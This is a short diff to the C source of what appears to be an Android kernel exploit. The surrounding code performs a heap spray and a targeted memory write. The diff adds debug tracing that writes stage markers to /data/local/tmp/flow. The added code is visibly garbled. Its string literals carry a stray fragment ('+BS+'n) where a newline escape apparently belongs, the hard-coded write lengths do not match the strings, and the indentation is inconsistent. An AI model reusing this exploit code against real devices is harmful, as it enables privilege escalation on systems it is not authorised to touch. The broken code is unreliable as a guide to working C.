@@ -466,8 +466,12 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
   if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
   TIMER("  heap spray done");
   durable_stage("spray_done_before_route_threads");
+  { int tf=open("/data/local/tmp/flow",O_WRONLY|O_CREAT|O_APPEND,0644);
+    if(tf>=0){write(tf,"MAIN_BEFORE_THREADS'+BS+'n",19);close(tf);} }
   run_main_route_threads();
   durable_stage("route_threads_returned");
+  { int tf=open("/data/local/tmp/flow",O_WRONLY|O_CREAT|O_APPEND,0644);
+    if(tf>=0){write(tf,"MAIN_AFTER_THREADS'+BS+'n",18);close(tf);} }
   TIMER("  PI route done");
   clear_pselect_write();
   return 1;
@@ -979,8 +983,12 @@ int run_exploit(int argc, char **argv) {
       proof_val = pselect_custom_value;
     TIMER("  heap spray done");
     durable_stage("spray_done_before_route_threads");
-    run_main_route_threads();
+    { int tf=open("/data/local/tmp/flow",O_WRONLY|O_CREAT|O_APPEND,0644);
+    if(tf>=0){write(tf,"MAIN_BEFORE_THREADS'+BS+'n",19);close(tf);} }
+  run_main_route_threads();
     durable_stage("route_threads_returned");
+  { int tf=open("/data/local/tmp/flow",O_WRONLY|O_CREAT|O_APPEND,0644);
+    if(tf>=0){write(tf,"MAIN_AFTER_THREADS'+BS+'n",18);close(tf);} }
     TIMER("  PI route done");
     clear_pselect_write();
     if (!strcmp(tgt_name, "spray")) {
